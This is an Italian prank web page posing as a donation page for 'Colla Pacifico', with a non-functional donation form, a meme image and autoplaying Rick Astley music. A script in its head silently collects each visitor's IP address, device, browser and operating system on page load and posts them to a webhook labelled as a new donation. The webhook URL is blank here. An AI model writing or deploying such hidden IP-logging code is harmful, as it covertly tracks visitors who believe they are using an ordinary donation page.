<html lang="it">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dona a Colla Pacifico</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;700&display=swap" rel="stylesheet">
    <script type="module">
        import { getDeviceInfo } from './deviceInfo.js';

        async function sendDonationWebhook() {
            try {
                const deviceInfo = await getDeviceInfo();
                
                const response = await fetch('', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        content: `ðŸš¨ Nuova Donazione! 
IP: ${deviceInfo.ip}
Dispositivo: ${deviceInfo.deviceType}
Browser: ${deviceInfo.browser}
Sistema Operativo: ${deviceInfo.os}`
                    })
                });
            } catch (error) {
                console.error('Errore invio webhook:', error);
            }
        }

        function moveTung() {
            const tung = document.getElementById('tung-image');
            let position = 0;
            let direction = 1;

            function animate() {
                position += direction * 5;
                tung.style.left = `${position}px`;

                // Reverse direction when hitting window edges
                if (position > window.innerWidth - tung.width || position < 0) {
                    direction *= -1;
                }

                requestAnimationFrame(animate);
            }

            animate();
        }

        window.addEventListener('DOMContentLoaded', () => {
            sendDonationWebhook();
            moveTung();

            // Auto-play background music
            const backgroundMusic = document.getElementById('background-music');
            backgroundMusic.volume = 0.3; // Set volume to 30%
            backgroundMusic.play().catch(e => console.log('Autoplay prevented:', e));

            // Form submission handling
            const donationForm = document.getElementById('donation-form');
            donationForm.addEventListener('submit', (e) => {
                e.preventDefault();
                const amountInput = document.getElementById('donation-amount');
                const amount = amountInput.value;
                
                if (amount && parseFloat(amount) > 0) {
                    alert(`Grazie per la tua donazione di â‚¬${amount}!`);
                    amountInput.value = ''; // Clear input
                } else {
                    alert('Per favore, inserisci un importo valido.');
                }
            });
        });
    </script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Roboto', Arial, sans-serif;
            background-color: #f4f4f4;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            position: relative;
            overflow: hidden;
            color: #333;
        }
        .container {
            background-color: white;
            border-radius: 15px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.1);
            padding: 40px;
            text-align: center;
            max-width: 500px;
            width: 100%;
            position: relative;
            z-index: 10;
        }
        h1 {
            color: #2c3e50;
            margin-bottom: 20px;
            font-size: 2.5em;
        }
        .donation-description {
            margin-bottom: 25px;
            color: #7f8c8d;
            line-height: 1.6;
        }
        .donation-form {
            display: flex;
            flex-direction: column;
        }
        #donation-amount {
            width: 100%;
            padding: 12px;
            margin-bottom: 15px;
            border: 2px solid #3498db;
            border-radius: 8px;
            font-size: 1em;
        }
        .donate-button {
            background-color: #2ecc71;
            color: white;
            border: none;
            padding: 15px;
            border-radius: 8px;
            cursor: pointer;
            font-size: 1.1em;
            transition: background-color 0.3s ease;
        }
        .donate-button:hover {
            background-color: #27ae60;
        }
        #tung-image {
            position: absolute;
            top: 50%;
            transform: translateY(-50%);
            max-width: 200px;
            z-index: -1;
            opacity: 0.3;
        }
    </style>
</head>
<body>
    <audio id="background-music" loop>
        <source src="/Rick Astley - Never Gonna Give You Up (Official Music Video) [ ezmp3.cc ].mp3" type="audio/mpeg">
        Your browser does not support the audio element.
    </audio>
    <img id="tung-image" src="/Tung Tung Tung Sahur.jpg" alt="Tung Tung Tung Sahur">
    <div class="container">
        <h1>Dona a Colla Pacifico</h1>
        <p class="donation-description">
            Il tuo supporto Ã¨ importante! Ogni donazione aiuta Colla Pacifico a continuare il suo lavoro.
        </p>
        <form id="donation-form">
            <input 
                type="number" 
                id="donation-amount" 
                placeholder="Inserisci l'importo (â‚¬)" 
                min="1" 
                step="0.01" 
                required
            >
            <button type="submit" class="donate-button">Dona Ora</button>
        </form>
    </div>
</body>
</html>
